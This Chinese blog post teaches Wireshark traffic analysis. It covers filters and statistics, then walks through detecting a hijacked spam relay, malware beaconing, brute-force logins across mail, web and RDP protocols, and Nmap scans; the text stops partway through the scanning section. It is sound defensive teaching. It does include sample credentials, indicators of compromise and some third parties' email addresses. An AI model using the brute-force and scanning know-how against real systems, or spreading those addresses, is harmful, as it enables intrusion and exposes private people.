---
layout:     post
title:      wireshark技巧
date:       2019-3-9
author:     Wh0ale
header-img: img/1.jpg
catalog: true
tags:
    - wireshark
---

这篇文章献给即将为两会通宵几个晚上的自己

# 0x01 基础操作

## **1.1 数据过滤**

ip过滤

```
ip.addr==x.x.x.x，ip.src== x.x.x.x,ip.dst== x.x.x.x
```

协议过滤

HTTP、HTTPS、SMTP、ARP等

端口过滤

```
tcp.port==21、udp.port==53
```

组合过滤

```
ip.addr==x.x.x.x && tcp.port==21、tcp.port==21 or udp.port==53
```

## **1.2 数据统计**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wxc32qmhj20qo0j4wgp.jpg)



**IP统计：**在菜单中选择Statistics，然后选择Conversation，就可以统计出所在数据包中所有通信IP地址，包括IPV4和IPV6。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wxo29ub1j20qq0ghdh7.jpg)



**端口统计：**同IP统计，点击TCP可以看到所有TCP会话的IP、端口包括数据包数等信息，且可以根据需求排序、过滤数据。UDP同理。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wxq8zj5gj20qq0ghq4a.jpg)



## 1.3 搜索功能

WireShark具备强大的搜索功能，在分析中可快速识别出攻击指纹。Ctrl+F弹出搜索对话框。

Display Filter：显示过滤器，用于查找指定协议所对应的帧。

Hex Value：搜索数据中十六进制字符位置。

String：字符串搜索。Packet list：搜索关键字匹配的Info所在帧的位置。Packet details：搜索关键字匹配的Info所包括数据的位置。Packet bytes：搜索关键字匹配的内容位置。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wxyx3141j20qn0jedi4.jpg)



## 1.4 Follow TCP Stream

对于TCP协议，可提取一次会话的TCP流进行分析。点击某帧TCP数据，右键选择Follow TCP Stream，就可以看到本次会话的文本信息，还具备搜索、另存等功能。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wy12s0b5j20ub0gztdo.jpg)



## 1.5 HTTP头部分析

对于HTTP协议，WireShark可以提取其URL地址信息。

在菜单中选择Statistics，选择HTTP，然后选择Packet Counter（可以过滤IP）,就可以统计出HTTP会话中请求、应答包数量。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wy2itwbtj20ma0dngm8.jpg)

在菜单中选择Statistics，选择HTTP，然后选择Requests（可以过滤IP）,就可以统计出HTTP会话中Request的域名，包括子域名。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wy52rm4sj20mm0gvdhx.jpg)

在菜单中选择Statistics，选择HTTP，然后选择Load Distribution（可以过滤IP）,就可以统计出HTTP会话的IP、域名分布情况，包括返回值。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wy5ferq0j20mp0cagn6.jpg)

## 1.6 数据包分析

### **1.6.1 地址解析协议 ARP**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xizbsfkmj20mo069ag8.jpg)

长度：8 位/字节，MAC 地址 48 位，即 6 字节，IP 地址 32 位，即 4 字节。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xj1hqh0qj20o00j7nf4.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xj38nugdj20o60jjtqo.jpg)

当 IP 地址改变后，网络主机中缓存的 IP 和 MAC 映射就失效了，为了防止通信错误， 无偿 ARP 请求被发送到网络中，强制所有收到它的设备更新 ARP 映射缓存

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xj5zn2plj20mk0g8dw3.jpg)



---

### **1.6.2 IP 协议**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjcyd60lj20lu0htqlr.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjd4x8xhj20m80gak8i.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjd8w2ocj20m60iyavb.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjdcmg2jj20m90k0awe.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjdg7zafj20ml0jgtub.jpg)

---

### 1.6.3 传输控制协议 TCP

TCP 端口

- 1~1023：标准端口组，特定服务会用到标准端口。 
- 1024~65535：临时端口组，操作系统会随机地选择一个源端口让某个通信单独使用

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjr842b0j20mg0fak7e.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjr842b0j20mg0fak7e.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjrns8qij20kl085jxj.jpg)

**tcp的三次握手**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjrtzhttj20it0980v7.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjsfstabj20ml0clgrx.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjsl4tu6j20me0f8ap1.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjsulnbrj20m40fah1q.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjt0ij6mj20lq0gondb.jpg)

TCP 的四次断开

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjw9osaaj20n40d0q95.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjwfngnpj20m50cmn83.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjwljoa1j20m40f0dta.jpg)

![![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjwtoc6bj20lr0f816d.jpg)](https://ws1.sinaimg.cn/large/b6de3d7dly1g0xjwp5sj1j20m00elk3f.jpg)











# 0x02 WireShark分析攻击行为步骤

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wy6rdouwj20ka0jtmyn.jpg)



## 2.1 肉鸡邮件服务器

肉鸡也称傀儡机，是指可以被黑客远程控制的机器。一旦成为肉鸡，就可以被攻击者随意利用，如：窃取资料、再次发起攻击、破坏等等。下面将利用WireShark一起学习一种肉鸡的用途：广告垃圾邮件发送站。

### 2.1.1 发现问题

在对某企业服务器群进行安全检测时发现客户一台服务器（10.190.214.130）存在异常，从其通信行为来看应该为一台空闲服务器。 经过一段时间的抓包采集，对数据进行协议统计发现，基本均为SMTP协议。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wyaz6arvj20ys0g4jxb.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wybmqumkj20q10dm0u6.jpg)

SMTP协议为邮件为邮件传输协议。正常情况下出现此协议有两种情况：

```
1、用户发送邮件产生。
2、邮件服务器正常通信产生。
```

该IP地址属于服务器，所以肯定非个人用户利用PC机发送邮件。

那这是一台邮件服务器？如果是，为什么仅有SMTP协议，POP3、HTTP、IMAP等等呢？

带着疑问我们统计了一下数据的IP、端口等信息：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wych4xg4j20sx0ibdjv.jpg)

统计信息表明：所有通信均是与61.158.163.126（河南三门峡）产生的SMTP协议，且服务器（10.190.214.130）开放了TCP25端口，它的的确确是一台邮件服务器。

到这，很多安全分析人员或监控分析软件就止步了。原因是IP合理、逻辑也合理、SMTP协议很少有攻击行为，以为是一次正常的邮件通信行为。那么很可惜，你将错过一次不大不小的安全威胁事件。

职业的敏感告诉我，它不是一台合理的邮件服务器。这个时候需要用到应用层的分析，看一看它的通信行为。继续看看SMTP登陆过程的数据。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wydh8c4fj20xh06h76l.jpg)

从数据看出，邮箱登陆成功，右键`Follow TCPStream`可以看见完整登陆信息。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wye79553j20js058wet.jpg)



```
334 VXNlcm5hbWU6          // Base64解码为：“Username:”
YWRtaW4=  //用户输入的用户名，Base Base64解码为：“admin”
334 UGFzc3dvcmQ6         //Base64解码为：“Password:”
YWRtaW4=  //用户输入的密码，Base Base64解码为：“admin”
235 Authentication successful.  //认证成功
MAIL FROM:<admin@system.mail>  //邮件发送自……
```

这段数据表明：61.158.163.126通过SMTP协议，使用用户名admin、密码admin，成功登陆邮件服务器10.190.214.30，邮件服务器的域名为@system.mail，且利用admin@system.mail发送邮件。

一看用户名、密码、邮箱，就发现问题了：

> 1、admin账号一般不会通过互联网登陆进行管理。
>
> 2、“二货”管理员才会把admin账号设为密码。
>
> 3、域名@system.mail与客户无任何关系。

很显然，这是一台被控制的邮件服务器—“肉鸡邮件服务器”。

题外插一个刚遇到的伪造邮件例子：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wyk6mm7uj20iq09ngmh.jpg)



### 2.1.2 行为跟踪

发现问题了，下一步跟踪其行为，这个肉鸡服务器到底是干什么的。查看Follow TCPStream完整信息可发现：这是一封由admin@system.mail群发的邮件，收件人包括： www651419067@126.com、wyq0204@yahoo.com.cn、zhaocl1@163.com等10个人（带QQ的邮箱暂时抹掉，原因见最后），邮件内容不多。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wyllls6vj20p90iwdi9.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wylt0k1nj20pb0iw77g.jpg)

为看到完整邮件内容，我们可以点击Save As存为X.eml，用outlook等邮件客户端打开。

![enter image description here](http://www.anquan.us/static/drops/full/d484829fa9f06826050549e552d6d0bafb9e5409.jpg)

一看邮件，所有谜团都解开了。邮件内容就是一封“巧虎”的广告垃圾邮件，该服务器被攻击者控制创建了邮件服务器，用于垃圾邮件发送站。再用同样的方法还原部分其它邮件：

![enter image description here](http://www.anquan.us/static/drops/full/38df7a54494fbd65b619d82e1e14acbceabe6c70.jpg)

![enter image description here](http://www.anquan.us/static/drops/full/24193bc03edb6a3e29fe4955e45b918135155a76.jpg)

可以看出邮件内容完全一样，从前面图中可看出短时间的监控中SMTP协议有几十次会话，也就说发送了几十次邮件，涉及邮箱几百人。邮件中的域名http://url7.me/HnhV1打开后会跳转至巧虎商品的广告页面。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wyp8hlbxj20yp0i3q5s.jpg)



### 2.1.3 分析结论

------

> 1、该服务器经简单探测，开放了TCP25/110/445/135/3389/139等大量高危端口，所以被攻击控制是必然。
>
> 2、该服务器已被控制创建了肉鸡邮件服务器（WinWebMail），邮件服务器域名为@system.mail，由61.158.163.126（河南省三门峡市）使用admin@system.mail用户登录，通过邮件客户端或专用软件往外发送垃圾邮件。
>
> 3、简单百度一下，很多人会经常收到来自admin@system.mail的垃圾邮件，今天终于弄清了它的来龙去脉。
>
> 4、垃圾邮件发送不是随便发的，是很有针对性的。巧虎是幼儿产品，从接受邮件的QQ号码中随便选取4位查询资料发现发送对象可能都为年轻的爸爸妈妈。



## 2.2 Bodisparking恶意代码

接到客户需求，对其互联网办公区域主机安全分析。在对某一台主机通信数据进行分析时，过滤了一下HTTP协议。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wyx0quqpj20yo0hpq95.jpg)

一看数据，就发现异常，这台主机HTTP数据不多，但大量HTTP请求均为“Get heikewww/www.txt”，问题的发现当然不是因为拼音“heike”。点击“Info”排列一下，可以看得更清楚，还可以看出请求间隔约50秒。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wz016yfbj20yp0hr7at.jpg)

为更加准确地分析其请求URL地址情况，在菜单中选择Statistics，选择HTTP，然后选择Requests。可以看到其请求的URL地址只有1个：“d.99081.com/heikewww/www.txt”，在短时间内就请求了82次。

这种有规律、长期请求同一域名的HTTP通信行为一般来说“非奸即盗”。

1. 奸：很多杀毒软件、APP、商用软件，为保持长连接状态，所装软件会定期通过HTTP或其它协议去连接它的服务器。这样做的目的可以提供在线服务、监控升级版本等等，但同时也可以监控你的电脑、手机，窃取你的信息。
2. 盗：木马、病毒等恶意软件为监控傀儡主机是否在线，会有心跳机制，那就是通过HTTP或其它协议去连接它的僵尸服务器，一旦你在线，就可以随时控制你。

我们再过滤一下DNS协议看看。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wz3b36ucj20yu0enwja.jpg)

可以看出，DNS请求中没有域名“d.99081.com”的相关请求，木马病毒通信不通过DNS解析的方法和技术很多，读者有兴趣可以自行查询学习。所以作为安全监控设备，仅基于DNS的监控是完全不够的。

接下来，我们看看HTTP请求的具体内容。点击HTTP GET的一包数据，可以看到请求完整域名为“d.99081.com/heikewww/www.txt”，且不断去获得www.txt文件。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wz7o2pstj20yu0ga792.jpg)

Follow TCPStream，可以看到去获得www.txt中的所有恶意代码。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wz7v0vr1j20vb0iwado.jpg)

到这儿，基本确认主机10.190.16.143上面运行了恶意代码，它会固定时间同199.59.243.120这个IP地址（域名为d.99081.com）通过HTTP协议进行通信，并下载运行上面的/heikewww/www.txt。

那么，是否还有其它主机也中招了呢？

这个问题很好解决，前提条件是得有一段时间全网的监控流量，然后看看还有哪些主机与IP(199.59.243.120)进行通信，如果域名是动态IP，那就需要再解析。

1. 如果抓包文件仅为一个PCAP文件，直接过滤`ip.addr==199.59.243.120`即可。
2. 全网流量一般速率较高，想存为一个包的可能性不大。假如有大量PCAP文件，一样通过WireShark可以实现批量过滤。

下面我们就根据这个案例，一起了解一下WireShark中“tshark.exe”的用法，用它来实现批量过滤。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wz9j7c4oj20lc0efta2.jpg)

**Tshark的使用需要在命令行环境下**，单条过滤命令如下：

```
cd C:\Program Files\Wireshark
tshark -r D:\DATA\1.cap -Y "ip.addr==199.59.243.120" -w E:\DATA\out\1.cap
```

解释：先进到WireShark目录，调用tshark程序，-r后紧跟源目录地址，-Y后紧跟过滤命令（跟Wireshrk中的Filter规则一致），-w后紧跟目的地址。

有了这条命令，就可以编写批处理对文件夹内大量PCAP包进行过滤。

通过这种办法，过滤了IP地址199.59.243.120所有的通信数据。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzaks1ooj20yt0gaq9f.jpg)

统计一下通信IP情况。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzas5sewj20mp07r758.jpg)

根据统计结果，可以发现全网中已有4台主机已被同样的恶意代码所感染，所有通信内容均一样，只是请求时间间隔略微不同，有的为50秒，有的为4分钟。

### 2.3.1 深入

**1 恶意代码源头**

在www.txt中我们找到了“/Zm9yY2VTUg”这个URL，打开查看后，发现都是一些赞助商广告等垃圾信息。如下图：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzcnaszgj20yq0gptbf.jpg)

通过Whois查询，我们了解到99081.com的域名服务器为`ns1.bodis.com`和`ns2.bodis.com`，bodis.com是BODIS, LLC公司的资产，访问其主页发现这是一个提供域名停放 （Domain Parking）服务的网站，用户将闲置域名交给它们托管，它们利用域名产生的广告流量和点击数量给用户相应的利益分成。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzd2om4sj208v05gwek.jpg)

**2 恶意代码行为**

经过公开渠道的资料了解到Bodis.com是一个有多年经营的域名停放服务提供商，主要靠互联网广告获取收入，其本身是否有非法网络行为还有待分析。

99081.com是Bodis.com的注册用户，即域名停放用户，它靠显示Bodis.com的广告并吸引用户点击获取自己的利润分成，我们初步分析的结果是99081.com利用系统漏洞或软件捆绑等方式在大量受害者计算机上安装并运行恶意代码访问其域名停放网站，通过产生大量流向99081.com的流量获取Bodis.com的利润分成。通常这种行为会被域名停放服务商认定为作弊行为，一旦发现会有较重的惩罚。

**3 攻击者身份**

根据代码结合其它信息，基本锁定攻击者身份信息。下图为其在某论坛注册的信息：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzf886w5j20fe0c7mxj.jpg)

### 2.3.2 结论

1. 攻击者通过非法手段利用域名停放网站广告，做一些赚钱的小黑产，但手法不够专业；
2. 攻击方式应是在通过网站挂马或软件捆绑等方式，访问被挂马网站和下载执行了被捆绑软件的人很容易成为受害者；
3. 恶意代码不断通过HTTP协议去访问其域名停放网站，攻击者通过恶意代码产生的流量赚钱。



## 2.3 暴力破解

------

暴力破解，即用暴力穷举的方式大量尝试性地猜破密码。猜破密码一般有3种方式：

**1、排列组合式**：首先列出密码组合的可能性，如数字、大写字母、小写字母、特殊字符等；按密码长度从1位、2位……逐渐猜试。当然这种方法需要高性能的破解算法和CPU/GPU做支持。

**2、字典破解**：大多攻击者并没有高性能的破解算法和CPU/GPU，为节省时间和提高效率，利用社会工程学或其它方式建立破译字典，用字典中存在的用户名、密码进行猜破。

**3、排列组合+字典破解相结合**。 理论上，只要拥有性能足够强的计算机和足够长的时间，大多密码均可以破解出来。

暴力破解一般有两种应用场景：

1、攻击之前，尝试破解一下用户是否存在弱口令或有规律的口令；如果有，那么对整个攻击将起到事半功倍的作用。

2、大量攻击之后，实在找不出用户网络系统中的漏洞或薄弱环节，那么只有上暴力破解，期待得到弱口令或有规律的口令。 所以，用户特别是管理员设置弱密码或有规律的密码是非常危险的，有可能成为黑客攻击的“敲门砖”或“最后一根救命稻草”。

暴力破解应用范围非常广，可以说只要需要登录的入口均可以采用暴力破解进行攻击。应用层面如：网页、邮件、FTP服务、Telnet服务等，协议层面如：HTTP、HTTPS、POP3、POP3S、IMAP、IMAPS、SMTP、SMTPS、FTP、TELNET、RDP、QQ、MSN等等。本文仅列举部分常见协议，其它协议情况类似。

### 2.3.1 正常登录状态

要从通信数据层面识别暴力破解攻击，首先我们得清楚各种协议正常登录的数据格式。下面我们来认识一下POP3/SMTP/IMAP/HTTP/HTTPS/RDP协议认证过程的常见数据格式，根据服务器类型的不同格式略微不同。（说明：本章使用服务器环境为Exchange2003和WampServer）

**1、POP3协议**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzq4l01cj20z80ju78e.jpg)

```
+OK Microsoft Exchange Server 2003 POP3 .......... 6.5.6944.0 (a-ba21a05129e24.test.org) ........   //服务器准备就绪
CAPA   //用于取得此服务器的功能选项清单
+OK Capability list follows
TOP
USER
PIPELINING
EXPIRE NEVER
UIDL
.
USER jufeng001@test.org    //与 POP3 Server 送出帐户名
+OK
PASS 1qaz@WSX    //与 POP3 Server 送出密码
+OK User successfully logged on.   //认证成功
STAT
+OK 14 21568
QUIT
+OK Microsoft Exchange Server 2003 POP3 .......... 6.5.6944.0 ..........
```

**2、SMTP协议**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzqdib9fj20yq0fmaeb.jpg)

```
220 a-ba21a05129e24.test.org Microsoft ESMTP MAIL Service, Version: 6.0.3790.3959 ready at  Thu, 6 Aug 2015 11:10:17 +0800  //服务就绪
EHLO Mr.RightPC //主机名
250-a-ba21a05129e24.test.org Hello [192.1.14.228]
……
250 OK
AUTH LOGIN  //认证开始
334 VXNlcm5hbWU6  // Username:
anVmZW5nMDAxQHRlc3Qub3Jn  //输入用户名的base64编码
334 UGFzc3dvcmQ6  // Password:
MXFhekBXU1g=   //输入密码的base64编码
235 2.7.0 Authentication successful.    //认证成功
```



**3、IMAP协议**

```
* OK Microsoft Exchange Server 2003 IMAP4rev1 .......... 6.5.6944.0 (a-ba21a05129e24.test.org) ........     //IMAP服务就绪
bf8p CAPABILITY
* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN
bf8p OK CAPABILITY completed.
s3yg LOGIN "jufeng002" "1qaz@WSX"        //输入用户名:jufeng002，密码:1qaz@WSX
s3yg OK LOGIN completed.     //认证成功
```



**4、HTTP协议**

HTTP协议认证格式较多，这里仅列一种作为参考。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzrpxajfj20yc0fzdk6.jpg)

```
Referer: http://192.1.14.199:8080/login.html     //登录地址
uname=jufeng001&upass=1qaz%40WSXHTTP/1.1 200 OK
…
<script>alert('OK')</script>
//输入用户名jufeng001，密码1qaz%40WSX，Web服务器返回HTTP/1.1 200和弹出对话框“OK”表示认证成功。
```



**5、HTTPS协议**

HTTPS协议为加密协议，从数据很难判断认证是否成功，只能根据数据头部结合社会工程学才能判断。如认证后有无查看网页、邮件的步骤，如有，就会产生加密数据。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzsbzz8lj20yr0f0jxi.jpg)

从数据中可看出HTTPS头部有认证协商的过程，认证后有大量加密数据，基本可判断认证成功。SSL认证过程见下图：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzsi4rsmj20yn0n4dj3.jpg)

**6、RDP协议**

RDP为Windows远程控制协议,采用TCP3389端口。本版本采用的加密算法为：128-bit RC4；红线内为登陆认证过程，后为登陆成功的操作数据。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wztvufitj20yo0fa0yh.jpg)



### 2.3.2 识别暴力破解

从暴力破解的原理可知，攻击中会产生大量猜试错误的口令。一般攻击者在爆破前会通过其他途径搜集或猜测用户的一些用户名，相关的字典和爆破算法，以提高效率。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzu4ec7kj20yv0dytdj.jpg)

从图中可发现，攻击者不断输入用户名jufeng001，不同的密码进行尝试，服务器也大量报错：`-ERR Logon failure: unknown user name or bad password`。Follow TCPStream可以看得更清楚。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzual008j20le0gcq4q.jpg)

提取所有信息，就可以知道攻击者猜破了哪些用户名、哪些口令。

**2、SMTP爆破**

SMTP协议往往是用户邮件安全管理的一个缺口，所以多被黑客利用。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzuphv3xj20yp0e2afa.jpg)

从图中可发现，攻击者不断输入用户名jufeng001，不同的密码进行尝试，服务器也大量报错：`535 5.7.3 Authentication unsuccessful`。Follow TCPStream：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzv005nlj20l80gdabm.jpg)

**3、IMAP爆破**

从下面两张图可以看出，IMAP爆破会不断重复LOGIN "用户名" "密码"，以及登录失败的报错：`NO Logon failure: unknown user name or bad password`。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzynugxfj20yi0e3wk4.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzz1s9x9j20lb0gbabm.jpg)

**4、HTTP爆破**

由于大量Web服务器的存在，针对HTTP的爆破行为也可以说是最多的，研究爆破方法和绕过机制的人也比较多。这里仅用最简单的Web实验环境做介绍。

首先打开数据可以看到，短时间内出现大量登录页面的请求包。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzzjw1ipj20yw0fd7ag.jpg)

提取Follow TCPStream可以看见输入用户名、密码情况，服务器返回值不再是登录成功的“OK”，而是登录错误的“…………”。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0wzzref2pj20ld0gemzr.jpg)

以上的“…………”并不是返回无内容，这是由于Wireshark无法识别该中文的编码的原因，我们可以点击Hex Dump看一下十六进制编码的内容。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0047whuj20lb0gbgov.jpg)

将提取Follow TCPStream的信息另存为1.html，用浏览器打开。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x00aoevlj20xa0bdwfm.jpg)

**5.HTTPS爆破**

HTTPS包括其它SSL协议的爆破从通信层面监控有一定的难度，因为认证过程加密了，无法知道攻击者使用的用户名、密码以及是否认证成功。但从爆破的原理可知，爆破会出现大量的登录过程，且基本没有认证成功，更不会有登录成功的操作过程。

如图：爆破过程中，不断出现认证过程：“`Client Hello`”、“`Server Hello`”等，并未出现登录成功后操作的大量加密数据。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x00pmhfpj20yw0e1tea.jpg)

点击Info可发现，在不到2秒的时间就出现16次认证，基本可以判断为暴力破解。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x00v8uevj20yu0e40xu.jpg)

**6.RDP爆破**

RDP爆破在黑客攻击中应用非常多，一旦破解出登录密码，基本可以控制这台机器。由于RDP协议数据也加密了，对于爆破的识别也有一定的困难，下面介绍另外一种方法快速识别，这种方法同样适用其它协议的爆破。

首先我们统计一下正常登录RDP协议的TCP端口等信息，可以看出正常登录的话，在一定时间内是一组“源端口和目的端口”。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x018v35hj20z80ju0v5.jpg)

再来看一下爆破RDP协议的TCP端口等信息，可以看出短时间内出现大量不同的“源端口和目的端口”，且包数和字节长度基本相同。这就表明出现大量动作基本相同的“短通信”，再结合数据格式就可以确定为暴力破解行为。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x01naczij20sz0hoq71.jpg)

**7.多用户同时爆破**

为提供命中率，攻击者往往会搜集大量的用户名作为字典同时开展爆破，希望达到“东方不亮西方亮”的效果。这种爆破方法同样很好识别，它的通信原理为：同一个攻击IP同时登录大量不同的用户名、尝试不同的口令、大量的登录失败的报错。

下图为同时对jufeng001、jufeng002、jufeng003、jufeng004等用户开展爆破的截图。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x05dhq1pj20yw0fbn2i.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x05hvh6hj20l90gat9v.jpg)



**8、如何识别爆破成功**

当然，发现爆破攻击行为仅仅是工作的一部分，更重要的是要清楚攻击者到底爆破是否成功，如果成功了会对我们造成什么影响。下面就基于Wireshark来介绍如何发现爆破成功。

（1）首先我们要清楚攻击者爆破的协议，以及该协议登录成功服务器返回值。如下图，为POP3的爆破，从前面的介绍我们知道如果登录成功服务器返回：“`+OK User successfully logged on`”。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0be3odpj20ys0fcjw8.jpg)

2）在数据中搜索“`+OK User successfully logged on`”。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0bm8cepj20ay06owew.jpg)

（3）通过搜索发现确实存在服务器返回的成功登录信息。

（4）Follow TCPStream发现攻击者在尝试了大量错误口令后，终于爆破成功：用户名jufeng001，密码1qaz@WSX。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0bz8nd7j20lb0gbmyt.jpg)

### 2.3.3 总结

1、无论是用户还是管理员，我们都要重视弱口令或有规律的口令这个安全问题，不要让安全防范输于细节。

2、验证码机制防范暴力破解仅适用于HTTP/HTTPS协议，无法防范其它协议。

3、理解了暴力破解的通信原理，从通信层面进行监控和阻止就可以实现。

4、重要管理系统的登录权限受到爆破攻击行为较多，登录权限最好绑定管理员常用的IP地址或增加认证机制，不给黑客爆破的机会。



## 2.4 扫描探测

“知己知彼，百战不殆。”扫描探测，目的就是“知彼”，为了提高攻击命中率和效率，基本上常见的攻击行为都会用到扫描探测。

扫描探测的种类和工具太多了，攻击者可以选择现有工具或自行开发工具进行扫描，也可以根据攻击需求采用不同的扫描方式。本文仅对`Nmap`常见的几种扫描探测方式进行分析。如：地址扫描探测、端口扫描探测、操作系统扫描探测、漏洞扫描探测（不包括`Web`漏洞，后面会有单独文章介绍`Web`漏洞扫描分析）。

### 2.4.1 地址扫描探测

地址扫描探测是指利用`ARP`、`ICMP`请求目标网段，如果目标网段没有过滤规则，则可以通过回应消息获取目标网段中存活机器的`IP`地址和`MAC`地址，进而掌握拓扑结构。

如：`192.1.14.235`向指定网段发起`ARP`请求，如果`IP`不存在，则无回应。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0eln8znj20ys0gp0yo.jpg)

如果`IP`存在，该`IP`会通过`ARP`回应攻击`IP`，发送自己的`MAC`地址与对应的`IP`。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0evw0ulj20z10gv0x5.jpg)

`ARP`欺骗适用范围多限于内网，通过互联网进行地址扫描一般基于`Ping`请求。

如：`192.1.14.235`向指定网段发起`Ping`请求，如果`IP`存在，则返回`Ping reply`。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0g7fq9xj20yw0gsq9b.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0hdvtvtj20yz0hadk5.jpg)

### 2.4.2 端口扫描探测

端口扫描是扫描行为中用得最多的，它能快速获取目的机器开启端口和服务的情况。常见的端口扫描类型有全连接扫描、半连接扫描、秘密扫描和`UDP`扫描。

**1、全连接扫描**

全连接扫描调用操作系统提供的`connect()`函数，通过完整的三次`TCP`连接来尝试目标端口是否开启。全连接扫描是一次完整的TCP连接。

**1）如果目标端口开启** 攻击方：首先发起`SYN`包；

目标：返回`SYN ACK`；

攻击方：发起`ACK`；

攻击方：发起`RST ACK`结束会话。

**2）如果端口未开启** 攻击方：发起`SYN`包；

目标：返回`RST ACK`结束会话。

如：`192.1.14.235`对`172.16.33.162`进行全连接端口扫描，首先发起`Ping`消息确认主机是否存在，然后对端口进行扫描。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0ji3mx8j20z00gqgsi.jpg)

下图为扫描到`TCP3389`端口开启的情况。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0jzch38j20yt0eejtw.jpg)

下图为扫描到`TCP1723`端口未开启的情况。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1g0x0kypfozj20z30gqgq6.jpg)

**2、半连接扫描**

半连接扫描不使用完整的`TCP`连接。攻击方发起`SYN`请求包；如果端口开启，目标主机回应`SYN ACK`包，攻击方再发送`RST`包。如果端口未开启，目标主机直接返回`RST`包结束会话。

如：`192.1.14.235`对`172.16.33.162`进行半连接端口扫描，首先发起`Ping`消息确认主机是否存在，然后对端口进行扫描。

![enter image description here](http://www.anquan.us/static/drops/full/7e79feecc18f1c463dfe8fe29ccf8893c507b0c5.jpg)

扫描到`TCP80`端口开启。

![enter image description here](http://www.anquan.us/static/drops/full/8f8568fe5e5361186fadf916021fbd5c4a973242.jpg)

`TCP23`端口未开启。

![enter image description here](http://www.anquan.us/static/drops/full/86b287f5be93f96d1d47614b10f5d1943dc68dcd.jpg)

**3、秘密扫描TCPFIN**

`TCP FIN`扫描是指攻击者发送虚假信息，目标主机没有任何响应时认为端口是开放的，返回数据包认为是关闭的。
